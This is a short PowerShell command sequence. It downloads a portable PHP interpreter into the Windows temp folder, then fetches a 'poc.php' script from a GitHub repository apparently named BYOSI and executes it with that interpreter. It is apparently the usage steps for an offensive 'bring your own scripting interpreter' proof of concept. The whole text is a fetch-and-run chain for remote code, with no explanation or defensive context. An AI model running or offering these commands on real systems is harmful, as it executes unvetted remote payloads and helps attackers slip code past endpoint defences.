wget https://windows.php.net/downloads/releases/php-8.3.6-nts-Win32-vs16-x64.zip -O C:\\Windows\\Temp\\php.zip
Expand-Archive -Path C:\\Windows\\Temp\\php.zip -DestinationPath C:\\Windows\\Temp\\php
wget https://raw.githubusercontent.com/oldkingcone/BYOSI/main/poc.php -O C:\\Windows\\Temp\\php\\poc.php
& "C:\\Windows\\Temp\\php\\php.exe" @('C:\Windows\Temp\php\poc.php')
